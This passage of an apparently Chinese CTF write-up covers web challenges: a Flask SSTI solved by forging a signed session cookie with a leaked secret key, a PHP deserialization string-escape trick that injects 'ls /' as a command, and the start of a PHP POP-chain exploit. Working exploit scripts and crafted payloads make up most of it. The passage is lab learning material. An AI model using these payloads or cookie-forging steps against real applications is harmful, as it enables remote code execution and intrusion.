</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.errorhandler</span><span class=p>(</span><span class=mi>404</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>page_not_find</span><span class=p>(</span><span class=n>e</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;404.html&#39;</span><span class=p>),</span> <span class=mi>404</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.errorhandler</span><span class=p>(</span><span class=mi>500</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>internal_server_error</span><span class=p>(</span><span class=n>e</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;500.html&#39;</span><span class=p>),</span> <span class=mi>500</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>8080</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>session中的user会被不正当的渲染，<code>config.py</code>里面读取到<code>y0u_n3ver_k0nw_s3cret_key_1s_newst4r</code>这个KEY，就可以RCE了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>logging</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>fenjing</span> <span class=kn>import</span> <span class=n>exec_cmd_payload</span>
</span></span><span class=line><span class=cl><span class=n>logging</span><span class=o>.</span><span class=n>basicConfig</span><span class=p>(</span><span class=n>level</span><span class=o>=</span><span class=n>logging</span><span class=o>.</span><span class=n>INFO</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BLACKLIST</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;__&#34;</span><span class=p>,</span> <span class=s2>&#34;{{&#34;</span><span class=p>,</span> <span class=s2>&#34;class&#34;</span><span class=p>,</span> <span class=s2>&#34;base&#34;</span><span class=p>,</span> <span class=s2>&#34;init&#34;</span><span class=p>,</span> <span class=s2>&#34;mro&#34;</span><span class=p>,</span> <span class=s2>&#34;subclasses&#34;</span><span class=p>,</span> <span class=s2>&#34;builtins&#34;</span><span class=p>,</span> <span class=s2>&#34;globals&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;flag&#34;</span><span class=p>,</span> <span class=s2>&#34;os&#34;</span><span class=p>,</span> <span class=s2>&#34;system&#34;</span><span class=p>,</span> <span class=s2>&#34;popen&#34;</span><span class=p>,</span> <span class=s2>&#34;eval&#34;</span><span class=p>,</span> <span class=s2>&#34;:&#34;</span><span class=p>,</span> <span class=s2>&#34;+&#34;</span><span class=p>,</span> <span class=s2>&#34;request&#34;</span><span class=p>,</span> <span class=s2>&#34;cat&#34;</span><span class=p>,</span> <span class=s2>&#34;tac&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;base64&#34;</span><span class=p>,</span> <span class=s2>&#34;nl&#34;</span><span class=p>,</span> <span class=s2>&#34;hex&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>u&#34;</span><span class=p>,</span> <span class=s2>&#34;</span><span class=se>\\</span><span class=s2>x&#34;</span><span class=p>,</span> <span class=s2>&#34;.&#34;</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>waf</span><span class=p>(</span><span class=n>s</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bool</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>all</span><span class=p>(</span><span class=n>word</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>s</span> <span class=k>for</span> <span class=n>word</span> <span class=ow>in</span> <span class=n>BLACKLIST</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen_fenjing_payload</span><span class=p>(</span><span class=n>cmd</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>payload</span><span class=p>,</span> <span class=n>_</span> <span class=o>=</span> <span class=n>exec_cmd_payload</span><span class=p>(</span><span class=n>waf</span><span class=p>,</span> <span class=n>cmd</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gen_signed_cookie</span><span class=p>(</span><span class=n>payload</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>secret</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>cookie_json</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>({</span><span class=s2>&#34;user&#34;</span><span class=p>:</span> <span class=n>payload</span><span class=p>},</span> <span class=n>ensure_ascii</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>proc</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=s2>&#34;flask-unsign&#34;</span><span class=p>,</span> <span class=s2>&#34;--sign&#34;</span><span class=p>,</span> <span class=s2>&#34;--cookie&#34;</span><span class=p>,</span> <span class=n>cookie_json</span><span class=p>,</span> <span class=s2>&#34;--secret&#34;</span><span class=p>,</span> <span class=n>secret</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=n>capture_output</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>proc</span><span class=o>.</span><span class=n>returncode</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>RuntimeError</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;flask-unsign failed: </span><span class=si>{</span><span class=n>proc</span><span class=o>.</span><span class=n>stderr</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>proc</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># ssti_payload = gen_fenjing_payload(&#34;ls /&#34;)</span>
</span></span><span class=line><span class=cl>    <span class=n>ssti_payload</span> <span class=o>=</span> <span class=n>gen_fenjing_payload</span><span class=p>(</span><span class=s2>&#34;tac /y0U3_f14g_1s_h3re&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Fenjing payload:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>ssti_payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>secret</span> <span class=o>=</span> <span class=s2>&#34;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>signed_cookie</span> <span class=o>=</span> <span class=n>gen_signed_cookie</span><span class=p>(</span><span class=n>ssti_payload</span><span class=p>,</span> <span class=n>secret</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>Signed cookie:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>signed_cookie</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/backdoor</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>baf2a37e-76b4-4a20-95a4-1d50fb24ae97.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>referer</span><span class=o>:</span> <span class=l>http://baf2a37e-76b4-4a20-95a4-1d50fb24ae97.node5.buuoj.cn:81/cancanneed?file=1.jpg</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>session=.eJxdzcEKgkAQBuBXkYH49VRRp96jk8qitdnC6i676yHEnj1_CYMO8zEzP8NMMkYd5CLTzgczpCzPrfFx7EsovNfqAOvaxsbvrFD_whYYjU1m-EuhTO9dSOxQ53BARFGU8IDzelh2laRKKmnIjWRkT17kQK7kRBR5kCM5k24L1l3cxud2FoiuhL-Dbu7L42I3y_wBmNpHmg.aJbi0A.VyZ7WpCdIRqTZl5WzFJtWw4jAfs</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=逃>逃</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>waf</span><span class=p>(</span><span class=nv>$str</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;bad&#34;</span><span class=p>,</span><span class=s2>&#34;good&#34;</span><span class=p>,</span><span class=nv>$str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>GetFlag</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span> <span class=o>=</span> <span class=s2>&#34;whoami&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>key</span> <span class=o>=</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>unserialize</span><span class=p>(</span><span class=nx>waf</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>GetFlag</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;key&#39;</span><span class=p>]))));</span> <span class=nx>www</span><span class=o>-</span><span class=nx>data</span> <span class=nx>www</span><span class=o>-</span><span class=nx>data</span>
</span></span></code></pre></td></tr></table></div></div><p>字符增多的字符串逃逸</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=s1>&#39;&#34;;s:3:&#34;cmd&#34;;s:4:&#34;ls /&#34;;}&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;bad&#34;</span><span class=o>*</span><span class=mi>24</span><span class=o>+</span><span class=s1>&#39;&#34;;s:3:&#34;cmd&#34;;s:4:&#34;ls /&#34;;}&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>waf</span><span class=p>(</span><span class=nv>$str</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>str_replace</span><span class=p>(</span><span class=s2>&#34;bad&#34;</span><span class=p>,</span><span class=s2>&#34;good&#34;</span><span class=p>,</span><span class=nv>$str</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>GetFlag</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$key</span> <span class=o>=</span> <span class=s1>&#39;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&#34;;s:3:&#34;cmd&#34;;s:4:&#34;ls /&#34;;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$cmd</span> <span class=o>=</span> <span class=s2>&#34;whoami&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>system</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$AA</span><span class=o>=</span><span class=k>new</span> <span class=nx>GetFlag</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$AA</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span><span class=o>=</span><span class=nx>waf</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$AA</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$res</span><span class=o>.</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span><span class=o>=</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$res</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$c</span><span class=o>-&gt;</span><span class=na>key</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=more-fast>More Fast</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Start</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$errMsg</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>errMsg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Pwn</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(){</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>obj</span><span class=o>-&gt;</span><span class=na>evil</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>evil</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>phpinfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Reverse</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$func</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__get</span><span class=p>(</span><span class=nv>$var</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Web</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$func</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$var</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>evil</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/flag/i&#34;</span><span class=p>,</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>var</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>func</span><span class=p>)(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>var</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;Not Flag&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Crypto</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$obj</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$wel</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>obj</span><span class=o>-&gt;</span><span class=na>good</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;NewStar&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Misc</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>evil</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=s2>&#34;good job but nothing&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;fast&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=k>throw</span> <span class=k>new</span> <span class=nx>Exception</span><span class=p>(</span><span class=s2>&#34;Nope&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>Fatal</span> <span class=nx>error</span><span class=o>:</span> <span class=nx>Uncaught</span> <span class=nx>Exception</span><span class=o>:</span> <span class=nx>Nope</span> <span class=nx>in</span> <span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=nx>www</span><span class=o>/</span><span class=nx>html</span><span class=o>/</span><span class=nx>index</span><span class=o>.</span><span class=nx>php</span><span class=o>:</span><span class=mi>55</span> <span class=nx>Stack</span> <span class=nx>trace</span><span class=o>:</span> <span class=c1>#0 {main} thrown in /var/www/html/index.php on line 55
</span></span></span></code></pre></td></tr></table></div></div><p>GC绕过即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Start.__destruct() --&gt; Crypto.__toString() --&gt; Reverse.__get() --&gt; Pwn.__invoke() --&gt; Web.evil() 
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Start</span><span class=p>{</span> <span class=k>public</span> <span class=nv>$errMsg</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Pwn</span><span class=p>{</span> <span class=k>public</span> <span class=nv>$obj</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Reverse</span><span class=p>{</span> <span class=k>public</span> <span class=nv>$func</span><span class=p>;</span> <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Web</span><span class=p>{</span> <span class=k>public</span> <span class=nv>$func</span><span class=p>;</span> <span class=k>public</span> <span class=nv>$var</span><span class=p>;</span> <span class=p>}</span>
